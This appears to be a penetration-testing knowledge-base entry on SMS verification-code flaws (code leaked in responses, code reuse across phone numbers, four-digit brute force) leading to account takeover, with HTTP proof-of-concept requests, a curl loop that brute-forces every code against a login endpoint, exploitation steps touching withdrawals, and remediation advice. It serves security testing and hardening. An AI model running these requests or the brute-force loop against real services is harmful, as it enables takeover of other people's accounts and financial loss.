---
title: SMS verification-code disclosure / reuse / brute force (arbitrary account takeover)
cve: None (business logic)
severity: critical
cvss: 9.1
product: Custom registration/login/password-change endpoints
versions: Any
ports: 80, 443
keywords: sms, code, verification-code disclosure, reuse, brute force, takeover
entry: Code in response / same-code reuse / four-digit brute force
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
/api/sms/send      /api/user/register      /api/user/findpwd
/api/login (phone number+verification code)   /api/user/bindPhone
```

Consider the three flaw types separately: **disclosure** (response body contains `code`/`smsCode`), **reuse** (the same code works for multiple phone numbers/repeatedly), **brute force** (4 digits, no attempt limit, no expiry).

## Prerequisites

- A normally registered account; request-capture tools; authorized test phone numbers.

## PoC

```http
### A. Disclosure: send a verification code and inspect the response
POST /api/sms/send HTTP/1.1
Content-Type: application/json

{"phone":"13900000001","type":"login"}

# If the response contains {"code":"1234"} / debug fields / digits in msg ⇒ log in directly

### B. Reuse: use phone A's code for phone B
POST /api/login HTTP/1.1
Content-Type: application/json

{"phone":"13900000002","code":"<code-received-by-A>"}

### C. Brute force: 4 digits, no attempt limit
for c in $(seq -w 0000 9999); do
  r=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login -H 'content-type: application/json' -d "{\"phone\":\"13900000001\",\"code\":\"$c\"}")
  echo "$c $r"
done | grep -v ' 401'
```

## Exploitation Steps

1. Start with A: if the response includes the code, log in directly; many sites with "test mode left enabled" behave this way.
2. Then try B: check whether the code is bound only to the session, not the phone number.
3. C: with four digits and no attempt limit, success is guaranteed within 10000 attempts (rate-limit to avoid crashing the site); unrestricted six-digit codes are also feasible but slower.
4. After obtaining account access, check password changes/card binding/withdrawals (financial impact); some sites expose other users' agent trees immediately after login.
5. Evidence: one successful login request + response; do not retain a phone-number database.

## Remediation and Mitigation

- Deliver codes only through SMS; never expose them in responses; six digits, 5-minute validity, 5-attempt limit, single use.
- Bind tightly to session + phone number; persist failed-verification counters in the database (in-memory counters can be bypassed by restarts).
- Apply consistent login/password-change/binding rate limits across both phone number and IP.

## References

- OWASP Authentication Cheat Sheet; OWASP WSTG-ATHN-03.
